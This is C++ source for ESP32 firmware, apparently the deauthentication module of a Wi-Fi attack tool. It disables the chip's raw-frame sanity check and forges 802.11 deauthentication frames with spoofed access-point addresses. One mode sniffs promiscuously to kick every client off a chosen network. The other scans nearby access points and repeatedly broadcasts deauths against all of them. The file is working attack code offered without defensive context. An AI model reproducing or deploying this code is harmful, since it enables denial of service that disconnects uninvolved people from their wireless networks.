#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"

// Structure to hold access point information
struct AP_Info {
    uint8_t bssid[6];  // BSSID of the access point
    int32_t channel;   // Channel the AP operates on
};

#define MAX_APS 30  // Maximum number of access points to store
AP_Info ap_list[MAX_APS];  // Array to store access point information
int ap_count = 0;  // Counter for how many access points were found
int deauth_iterations = 0;  // Counter for deauth iterations before rescan

deauth_frame_t deauth_frame;
int deauth_type = DEAUTH_TYPE_SINGLE;
int eliminated_stations;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

// Function to perform a Wi-Fi scan and store AP information
void performWiFiScan() {
    int n = WiFi.scanNetworks(false, true, true, 120UL);  //optimized configs
    if (n == 0) {
        DEBUG_PRINTLN("❓ No networks found during scan");
        ap_count = 0;
        return;
    }
    ap_count = (n > MAX_APS) ? MAX_APS : n;  // Limit the results to MAX_APS
    for (int i = 0; i < ap_count; i++) {
        memcpy(ap_list[i].bssid, WiFi.BSSID(i), 6);
        ap_list[i].channel = WiFi.channel(i);
        DEBUG_PRINTF("❗ Found AP %d: BSSID %02X:%02X:%02X:%02X:%02X:%02X, Channel %d\n",
                     i, ap_list[i].bssid[0], ap_list[i].bssid[1], ap_list[i].bssid[2],
                     ap_list[i].bssid[3], ap_list[i].bssid[4], ap_list[i].bssid[5], ap_list[i].channel);
    }
    WiFi.scanDelete();  // Free up memory used by the scan
    deauth_iterations = 0;  // Reset iteration counter after scan
}

// Function to send deauth frames to a specific AP
void sendDeauthFrame(uint8_t bssid[6], int channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);  // Set channel
    memcpy(deauth_frame.station, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);  // Broadcast to all clients
    memcpy(deauth_frame.access_point, bssid, 6);  // BSSID
    memcpy(deauth_frame.sender, bssid, 6);  // Source (AP MAC)
    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
    }
    DEBUG_PRINTF("✅ Sent %d Deauth-Frames to BSSID: %02X:%02X:%02X:%02X:%02X:%02X on Channel %d\n",
                 NUM_FRAMES_PER_DEAUTH, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], channel);
    BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
    eliminated_stations++;  // Increment counter for feedback
}

// Function to perform deauth attack on all scanned APs
void deauth_all() {
    if (deauth_iterations == 0) {
        performWiFiScan();  // Scan for APs only when iterations reset
    }
    if (ap_count > 0) {
        for (int i = 0; i < ap_count; i++) {
            sendDeauthFrame(ap_list[i].bssid, ap_list[i].channel);
        }
        deauth_iterations++;
        if (deauth_iterations < 3) {
            delay(1000);  // 1-second delay between deauth iterations
            //DEBUG_PRINTLN("Waiting 1 second before next deauth iteration");
            DEBUG_PRINTLN("########################################");
        } else {
            deauth_iterations = 0;  // Reset to trigger rescan next time
            DEBUG_PRINTLN("🆗 Completed 3 deauth iterations, will rescan next call");
        }
    } else {
        delay(1000);  // Wait 1 second if no APs found to avoid rapid looping
        deauth_iterations = 0;  // Reset to trigger rescan
        DEBUG_PRINTLN("❓ No APs found, waiting 1 second before rescan");
    }
}

IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  const mac_hdr_t *mac_header = &packet->hdr;

  const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

  if (packet_length < 0) return;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
      eliminated_stations++;
      DEBUG_PRINTF("✅ Send %d Deauth-Frames to: %02X:%02X:%02X:%02X:%02X:%02X\n",
                   NUM_FRAMES_PER_DEAUTH, mac_header->src[0], mac_header->src[1], mac_header->src[2],
                   mac_header->src[3], mac_header->src[4], mac_header->src[5]);
      BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
    }
  }
}

void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
  eliminated_stations = 0;
  deauth_type = attack_type;
  deauth_frame.reason = reason;
  deauth_iterations = 0;  // Reset iterations for new attack

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    DEBUG_PRINT("⚠ Starting Deauth-Attack on network: ");
    DEBUG_PRINTLN(WiFi.SSID(wifi_number));
    WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_number));
    memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
    memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&sniffer);
  } else {
    DEBUG_PRINTLN("⚠ Starting Deauth-Attack on all detected stations!");
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_set_promiscuous(true);  // Enable promiscuous mode
    esp_wifi_set_promiscuous_filter(&filt);
    deauth_all();  // Initial scan and deauth
  }
}

void stop_deauth() {
  DEBUG_PRINTLN("🛑 Stopping Deauth-Attack..");
  esp_wifi_set_promiscuous(false);
  ap_count = 0;  // Reset AP count
  deauth_iterations = 0;  // Reset iterations
}